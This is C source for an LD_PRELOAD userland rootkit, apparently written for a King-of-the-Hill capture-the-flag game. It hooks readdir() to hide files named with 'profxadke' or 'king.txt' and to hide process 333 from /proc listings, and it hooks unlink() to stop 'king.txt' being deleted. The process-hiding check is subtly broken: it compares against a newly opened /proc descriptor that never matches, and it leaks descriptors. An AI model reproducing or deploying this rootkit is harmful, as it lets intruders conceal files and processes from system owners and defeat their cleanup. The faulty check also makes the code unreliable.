#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
static int (*orig_unlink)(const char *pathname) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide files/directories containing "profxadke" or "king.txt"
        if (strstr(entry->d_name, "profxadke") == NULL && strstr(entry->d_name, "king.txt") == NULL) {
            // Hide process with a specific PID (e.g., 333)
            if (dirfd(dirp) == open("/proc", O_RDONLY) && strcmp(entry->d_name, "333") == 0) {
                continue;
            }
            return entry;
        }
    }
    return NULL;
}

int unlink(const char *pathname) {
    if (!orig_unlink) {
        orig_unlink = dlsym(RTLD_NEXT, "unlink");
    }

    // Protect "king.txt" from being deleted
    if (strstr(pathname, "king.txt") != NULL) {
        errno = EACCES;
        return -1;
    }
    return orig_unlink(pathname);
}
